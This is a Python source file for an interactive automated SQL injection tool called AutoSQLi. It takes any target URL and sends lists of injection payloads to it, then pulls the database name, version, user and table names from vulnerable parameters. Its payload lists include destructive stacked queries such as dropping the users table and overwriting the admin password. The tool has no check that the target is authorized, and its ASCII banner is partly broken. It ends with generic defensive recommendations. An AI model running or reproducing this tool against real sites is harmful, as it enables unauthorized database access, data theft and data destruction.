#!/usr/bin/env python3
"""
AutoSQLi - Complete Automated SQL Injection Testing Framework
Author: Vishal Tiwari
Usage: python autosqli.py
"""

import requests
import time
import sys
import re
import json
import hashlib
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style
import threading
from datetime import datetime

# Initialize colorama
init(autoreset=True)

class AutoSQLi:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "vulnerable": False,
            "injection_points": [],
            "database_info": {},
            "extracted_data": {},
            "techniques_found": [],
            "full_report": {}
        }
        self.stop_testing = False
        self.lock = threading.Lock()
        
        # Payloads organized by technique
        self.payloads = {
            "error_based": [
                "'",
                "\"",
                "\\",
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR '1'='1'--",
                "' OR 1=1 AND SLEEP(5)--",
                "' UNION SELECT NULL--",
                "' AND extractvalue(1,concat(0x7e,database()))--",
                "' AND updatexml(1,concat(0x7e,database()),1)--",
                "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "1' AND 1=CAST((SELECT database()) AS INT)--",
                "1' AND 1=CONVERT(INT,(SELECT user()))--"
            ],
            "boolean_based": [
                "1' AND '1'='1",
                "1' AND '1'='2",
                "1' AND 1=1--",
                "1' AND 1=2--",
                "1' OR '1'='1'--",
                "1' OR 1=1--",
                "1' XOR 1=1--",
                "1' XOR 1=2--",
                "1' AND (SELECT 1 FROM users LIMIT 1)=1--",
                "1' AND ASCII(SUBSTRING(database(),1,1))>64--"
            ],
            "time_based": [
                "1' AND SLEEP(5)--",
                "1' AND pg_sleep(5)--",
                "1' WAITFOR DELAY '0:0:5'--",
                "1' AND DBMS_LOCK.SLEEP(5)--",
                "1' AND BENCHMARK(10000000,MD5('a'))--",
                "1' OR SLEEP(5)--",
                "1' AND IF(1=1,SLEEP(5),0)--",
                "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
                "1' UNION SELECT SLEEP(5)--"
            ],
            "union_based": [
                "1' UNION SELECT NULL--",
                "1' UNION SELECT NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL--",
                "1' UNION SELECT NULL,NULL,NULL,NULL--",
                "1' UNION SELECT 1,2,3--",
                "1' UNION SELECT 'a','b','c'--",
                "1' UNION SELECT @@version,user(),database()--",
                "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "1' UNION SELECT column_name,NULL FROM information_schema.columns--"
            ],
            "stacked_queries": [
                "1'; DROP TABLE users--",
                "1'; SELECT * FROM users--",
                "1'; INSERT INTO users VALUES('hacker','pass')--",
                "1'; UPDATE users SET password='hacked' WHERE username='admin'--"
            ]
        }
        
        # Database signatures
        self.db_signatures = {
            "mysql": ["mysql", "maria", "innodb", "myisam", "sql syntax"],
            "postgresql": ["postgresql", "pg_", "pgsql", "postgres"],
            "mssql": ["sql server", "mssql", "sybase", "ms sql"],
            "oracle": ["oracle", "ora-", "pl/sql", "oracle database"],
            "sqlite": ["sqlite", "sqlite3", "sqlite_"]
        }
        
        # Error patterns
        self.error_patterns = {
            "mysql": [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"check the manual that corresponds to your MySQL",
                r"You have an error in your SQL syntax"
            ],
            "postgresql": [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_.*",
                r"valid PostgreSQL result",
                r"Npgsql",
                r"PG::SyntaxError",
                r"Postgres query"
            ],
            "mssql": [
                r"Driver.*SQL Server",
                r"OLE DB.* SQL Server",
                r"(\W|\A)SQL Server.*Driver",
                r"Warning.*mssql_.*",
                r"Microsoft SQL Native Client error",
                r"Unclosed quotation mark"
            ],
            "oracle": [
                r"ORA-[0-9]{5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*\Woci_.*",
                r"Oracle.*CONNECTION"
            ]
        }

    def print_banner(self):
        """Display tool banner"""
        banner = f"""
{Fore.CYAN}{'='*60}
{Fore.YELLOW}   ___       ___    _____   _    __    ___ 
{Fore.YELLOW}  / _ \     / 
{Fore.YELLOW}  
{Fore.YELLOW}  
{Fore.GREEN}     Automated SQL Injection Testing Framework
{Fore.CYAN}{'='*60}
{Fore.WHITE}Author: Vishal Tiwari | Version: 1.0
{Fore.CYAN}{'='*60}{Style.RESET_ALL}
"""
        print(banner)

    def get_target_info(self):
        """Collect target information from user"""
        print(f"{Fore.YELLOW}[?] Target Information Collection{Style.RESET_ALL}")
        
        target = {}
        
        # Basic URL
        target['url'] = input(f"{Fore.GREEN}[>] Target URL (e.g., http://example.com/page.php): {Style.RESET_ALL}")
        
        # HTTP Method
        target['method'] = input(f"{Fore.GREEN}[>] HTTP Method (GET/POST, default GET): {Style.RESET_ALL}").upper() or "GET"
        
        # Parameters
        if target['method'] == "GET":
            parsed = urlparse(target['url'])
            params = parse_qs(parsed.query)
            if params:
                print(f"{Fore.CYAN}[!] Detected parameters: {list(params.keys())}{Style.RESET_ALL}")
                use_detected = input(f"{Fore.GREEN}[>] Use detected parameters? (Y/n): {Style.RESET_ALL}").lower()
                if use_detected != 'n':
                    target['parameters'] = list(params.keys())
                else:
                    target['parameters'] = input(f"{Fore.GREEN}[>] Enter parameter names (comma-separated): {Style.RESET_ALL}").split(',')
            else:
                target['parameters'] = input(f"{Fore.GREEN}[>] Enter parameter names (comma-separated): {Style.RESET_ALL}").split(',')
        else:
            target['parameters'] = input(f"{Fore.GREEN}[>] Enter parameter names (comma-separated): {Style.RESET_ALL}").split(',')
            target['post_data'] = input(f"{Fore.GREEN}[>] Enter POST data template (e.g., user=admin&pass=123): {Style.RESET_ALL}")
        
        # Additional options
        target['cookie'] = input(f"{Fore.GREEN}[>] Cookie (optional): {Style.RESET_ALL}") or None
        target['user_agent'] = input(f"{Fore.GREEN}[>] Custom User-Agent (optional, press Enter for default): {Style.RESET_ALL}") or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        target['headers'] = input(f"{Fore.GREEN}[>] Additional headers (JSON format, optional): {Style.RESET_ALL}") or "{}"
        
        # Performance
        target['timeout'] = int(input(f"{Fore.GREEN}[>] Request timeout (seconds, default 10): {Style.RESET_ALL}") or 10)
        target['delay'] = float(input(f"{Fore.GREEN}[>] Delay between requests (seconds, default 0.5): {Style.RESET_ALL}") or 0.5)
        target['threads'] = int(input(f"{Fore.GREEN}[>] Number of threads (default 5): {Style.RESET_ALL}") or 5)
        
        # Test scope
        print(f"\n{Fore.YELLOW}[?] Test Configuration{Style.RESET_ALL}")
        print(f"{Fore.CYAN}1. Quick test (basic payloads only)")
        print(f"2. Standard test (all payloads)")
        print(f"3. Aggressive test (includes dangerous payloads)")
        print(f"4. Custom{Style.RESET_ALL}")
        
        scope = input(f"{Fore.GREEN}[>] Select test scope (1-4, default 2): {Style.RESET_ALL}") or "2"
        target['scope'] = int(scope)
        
        return target

    def prepare_request(self, target, parameter, value):
        """Prepare request with injected payload"""
        try:
            headers = {
                'User-Agent': target['user_agent'],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close'
            }
            
            # Add custom headers
            try:
                custom_headers = json.loads(target['headers'])
                headers.update(custom_headers)
            except:
                pass
            
            if target['cookie']:
                headers['Cookie'] = target['cookie']
            
            if target['method'] == "GET":
                # Parse URL and replace parameter
                parsed = urlparse(target['url'])
                params = parse_qs(parsed.query, keep_blank_values=True)
                
                # Update parameter value
                params[parameter] = [value]
                
                # Rebuild URL
                new_query = urlencode(params, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                
                response = self.session.get(
                    new_url, 
                    headers=headers, 
                    timeout=target['timeout'],
                    verify=False
                )
            else:
                # POST request
                post_data = target['post_data']
                # Replace parameter in post data
                # Simple replacement - works for standard formats
                import re
                pattern = rf'({parameter}=)[^&]*'
                new_post_data = re.sub(pattern, rf'\g<1>{value}', post_data)
                
                response = self.session.post(
                    target['url'],
                    data=new_post_data,
                    headers=headers,
                    timeout=target['timeout'],
                    verify=False
                )
            
            return response
            
        except Exception as e:
            return None

    def analyze_response(self, response, original_response, payload, technique, response_time):
        """Analyze response for SQL injection indicators"""
        if not response:
            return False, {}
        
        indicators = {
            "vulnerable": False,
            "technique": technique,
            "payload": payload,
            "database": None,
            "confidence": 0,
            "evidence": []
        }
        
        # Calculate differences
        length_diff = len(response.text) - len(original_response.text)
        time_diff = response_time
        
        # Check for error messages
        response_lower = response.text.lower()
        
        # Database detection through errors
        for db, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    indicators['database'] = db
                    indicators['confidence'] += 30
                    indicators['evidence'].append(f"Found {db} error pattern: {pattern}")
                    self.results['database_info']['type'] = db
        
        # Technique-specific analysis
        if technique == "error_based":
            if any(err in response_lower for err in ['sql syntax', 'mysql', 'ora-', 'postgresql', 'sql server']):
                indicators['vulnerable'] = True
                indicators['confidence'] += 80
                indicators['evidence'].append("Error-based SQL injection detected")
                
                # Extract potential data from errors
                data_patterns = [
                    r"database[:\s]+([a-zA-Z0-9_]+)",
                    r"table[:\s]+([a-zA-Z0-9_]+)",
                    r"column[:\s]+([a-zA-Z0-9_]+)",
                    r"version[:\s]+([0-9\.]+)",
                    r"user[:\s]+([a-zA-Z0-9_@]+)"
                ]
                
                for pattern in data_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    if matches:
                        indicators['evidence'].append(f"Extracted data: {matches[:3]}")
        
        elif technique == "boolean_based":
            # Compare with original response
            if abs(length_diff) > 50 or response.status_code != original_response.status_code:
                indicators['vulnerable'] = True
                indicators['confidence'] += 70
                indicators['evidence'].append(f"Boolean-based condition changed response (diff: {length_diff} bytes)")
        
        elif technique == "time_based":
            if time_diff >= 4.5:  # Expecting 5 second delay with some margin
                indicators['vulnerable'] = True
                indicators['confidence'] += 90
                indicators['evidence'].append(f"Time-based injection confirmed ({time_diff:.2f}s delay)")
        
        elif technique == "union_based":
            # Check for increased row count or unusual content
            if "union" in response_lower or length_diff > 200:
                if len(response.text) > len(original_response.text) * 1.5:
                    indicators['vulnerable'] = True
                    indicators['confidence'] += 75
                    indicators['evidence'].append("Union-based injection likely (increased response size)")
        
        return indicators['vulnerable'], indicators

    def test_parameter(self, target, parameter, original_response, original_time):
        """Test a single parameter with all payload types"""
        results = []
        
        # Select payloads based on scope
        if target['scope'] == 1:  # Quick test
            test_payloads = {
                "error_based": self.payloads["error_based"][:3],
                "boolean_based": self.payloads["boolean_based"][:4],
                "time_based": self.payloads["time_based"][:2],
                "union_based": self.payloads["union_based"][:2]
            }
        elif target['scope'] == 2:  # Standard test
            test_payloads = self.payloads
        else:  # Aggressive test
            test_payloads = self.payloads
        
        print(f"{Fore.CYAN}[*] Testing parameter: {parameter}{Style.RESET_ALL}")
        
        for technique, payloads in test_payloads.items():
            for payload in payloads:
                if self.stop_testing:
                    break
                
                # Respect delay
                time.sleep(target['delay'])
                
                try:
                    start_time = time.time()
                    response = self.prepare_request(target, parameter, payload)
                    response_time = time.time() - start_time
                    
                    if response:
                        is_vulnerable, indicators = self.analyze_response(
                            response, original_response, payload, technique, response_time
                        )
                        
                        if is_vulnerable:
                            with self.lock:
                                self.results['vulnerable'] = True
                                if technique not in self.results['techniques_found']:
                                    self.results['techniques_found'].append(technique)
                                
                                result_entry = {
                                    "parameter": parameter,
                                    "technique": technique,
                                    "payload": payload,
                                    "confidence": indicators.get('confidence', 0),
                                    "database": indicators.get('database'),
                                    "evidence": indicators.get('evidence', [])
                                }
                                self.results['injection_points'].append(result_entry)
                                
                                print(f"{Fore.RED}[!] VULNERABLE: {parameter} - {technique.upper()}{Style.RESET_ALL}")
                                print(f"{Fore.YELLOW}    Payload: {payload}{Style.RESET_ALL}")
                                print(f"{Fore.YELLOW}    Evidence: {indicators.get('evidence', ['N/A'])[0]}{Style.RESET_ALL}")
                            
                            # If vulnerable, extract more data
                            if technique in ["error_based", "union_based"]:
                                self.extract_data(target, parameter)
                            
                            # For time-based, we can stop after confirmation
                            if technique == "time_based":
                                break
                                
                except Exception as e:
                    print(f"{Fore.RED}[-] Error testing {parameter}: {str(e)}{Style.RESET_ALL}")
        
        return results

    def extract_data(self, target, vulnerable_param):
        """Extract database information from vulnerable parameter"""
        print(f"{Fore.CYAN}[*] Attempting data extraction from {vulnerable_param}{Style.RESET_ALL}")
        
        extraction_queries = {
            "database": [
                "1' UNION SELECT database()--",
                "1' AND extractvalue(1,concat(0x7e,database()))--",
                "1' UNION SELECT NULL,database()--"
            ],
            "version": [
                "1' UNION SELECT version()--",
                "1' AND extractvalue(1,concat(0x7e,version()))--",
                "1' UNION SELECT @@version--"
            ],
            "user": [
                "1' UNION SELECT user()--",
                "1' AND extractvalue(1,concat(0x7e,user()))--",
                "1' UNION SELECT current_user--"
            ],
            "tables": [
                "1' UNION SELECT table_name FROM information_schema.tables--",
                "1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--"
            ]
        }
        
        extracted = {}
        
        for info_type, queries in extraction_queries.items():
            for query in queries:
                try:
                    response = self.prepare_request(target, vulnerable_param, query)
                    if response:
                        # Look for data in response
                        data_matches = re.findall(r'[a-zA-Z0-9_@\.\-]+', response.text)
                        if data_matches and len(data_matches) > 5:
                            extracted[info_type] = data_matches[:5]
                            print(f"{Fore.GREEN}[+] Extracted {info_type}: {data_matches[:3]}{Style.RESET_ALL}")
                            break
                except:
                    pass
                
                time.sleep(target['delay'])
        
        if extracted:
            self.results['extracted_data'][vulnerable_param] = extracted

    def generate_report(self):
        """Generate comprehensive test report"""
        report = f"""
{Fore.CYAN}{'='*70}
{Fore.YELLOW}                    SQL INJECTION TEST REPORT
{Fore.CYAN}{'='*70}
{Style.RESET_ALL}

{Fore.WHITE}Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{Fore.WHITE}Target: {self.target_info['url']}
{Fore.WHITE}Method: {self.target_info['method']}
{Fore.WHITE}Parameters Tested: {', '.join(self.target_info['parameters'])}

{Fore.CYAN}{'-'*70}
{Fore.YELLOW}VULNERABILITY ASSESSMENT
{Fore.CYAN}{'-'*70}

Vulnerable: {Fore.RED if self.results['vulnerable'] else Fore.GREEN}{self.results['vulnerable']}{Style.RESET_ALL}
Techniques Found: {', '.join(self.results['techniques_found']) if self.results['techniques_found'] else 'None'}

{Fore.CYAN}{'-'*70}
{Fore.YELLOW}INJECTION POINTS
{Fore.CYAN}{'-'*70}
"""
        
        if self.results['injection_points']:
            for i, point in enumerate(self.results['injection_points'], 1):
                report += f"""
[{i}] Parameter: {point['parameter']}
    Technique: {point['technique'].upper()}
    Confidence: {point['confidence']}%
    Payload: {point['payload']}
    Evidence: {', '.join(point['evidence'])}
"""
        else:
            report += "\nNo injection points found.\n"
        
        if self.results['extracted_data']:
            report += f"""
{Fore.CYAN}{'-'*70}
{Fore.YELLOW}EXTRACTED DATA
{Fore.CYAN}{'-'*70}
"""
            for param, data in self.results['extracted_data'].items():
                report += f"\nParameter: {param}\n"
                for info_type, values in data.items():
                    report += f"  {info_type}: {', '.join(str(v) for v in values)}\n"
        
        if self.results['database_info']:
            report += f"""
{Fore.CYAN}{'-'*70}
{Fore.YELLOW}DATABASE INFORMATION
{Fore.CYAN}{'-'*70}
"""
            for key, value in self.results['database_info'].items():
                report += f"{key}: {value}\n"
        
        report += f"""
{Fore.CYAN}{'='*70}
{Fore.YELLOW}RECOMMENDATIONS
{Fore.CYAN}{'='*70}

1. Use parameterized queries/prepared statements
2. Implement input validation and sanitization
3. Apply principle of least privilege for database accounts
4. Use Web Application Firewall (WAF)
5. Regularly update and patch database systems
6. Disable error display in production
7. Implement proper logging and monitoring

{Fore.CYAN}{'='*70}
{Fore.GREEN}Report Generated by AutoSQLi Framework
{Fore.CYAN}{'='*70}{Style.RESET_ALL}
"""
        
        return report

    def run(self):
        """Main execution function"""
        self.print_banner()
        
        # Get target information
        self.target_info = self.get_target_info()
        
        print(f"\n{Fore.GREEN}[+] Starting automated SQL injection test...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[!] Target: {self.target_info['url']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[!] Parameters: {', '.join(self.target_info['parameters'])}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[!] Test scope: {'Quick' if self.target_info['scope'] == 1 else 'Standard' if self.target_info['scope'] == 2 else 'Aggressive'}{Style.RESET_ALL}")
        
        # Get baseline response
        print(f"\n{Fore.YELLOW}[*] Establishing baseline response...{Style.RESET_ALL}")
        baseline_response = None
        for param in self.target_info['parameters']:
            baseline_response = self.prepare_request(self.target_info, param, "1")
            if baseline_response:
                break
        
        if not baseline_response:
            print(f"{Fore.RED}[-] Failed to connect to target!{Style.RESET_ALL}")
            return
        
        baseline_time = self.target_info['timeout']
        
        # Test each parameter
        print(f"\n{Fore.YELLOW}[*] Starting injection tests...{Style.RESET_ALL}\n")
        
        with ThreadPoolExecutor(max_workers=self.target_info['threads']) as executor:
            futures = []
            for param in self.target_info['parameters']:
                future = executor.submit(
                    self.test_parameter, 
                    self.target_info, 
                    param, 
                    baseline_response, 
                    baseline_time
                )
                futures.append(future)
            
            # Wait for all tests to complete
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{Fore.RED}[-] Error in thread: {e}{Style.RESET_ALL}")
        
        # Generate and display report
        print(f"\n{Fore.GREEN}[+] Testing completed! Generating report...{Style.RESET_ALL}\n")
        report = self.generate_report()
        print(report)
        
        # Save report to file
        filename = f"autosqli_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            # Remove color codes for file
            clean_report = re.sub(r'\x1b\[[0-9;]*m', '', report)
            f.write(clean_report)
        
        print(f"{Fore.GREEN}[+] Report saved to: {filename}{Style.RESET_ALL}")
        
        # Save JSON results
        json_filename = filename.replace('.txt', '.json')
        with open(json_filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        print(f"{Fore.GREEN}[+] JSON results saved to: {json_filename}{Style.RESET_ALL}")

def main():
    """Entry point"""
    try:
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        
        # Run the tool
        tester = AutoSQLi()
        tester.run()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Test interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
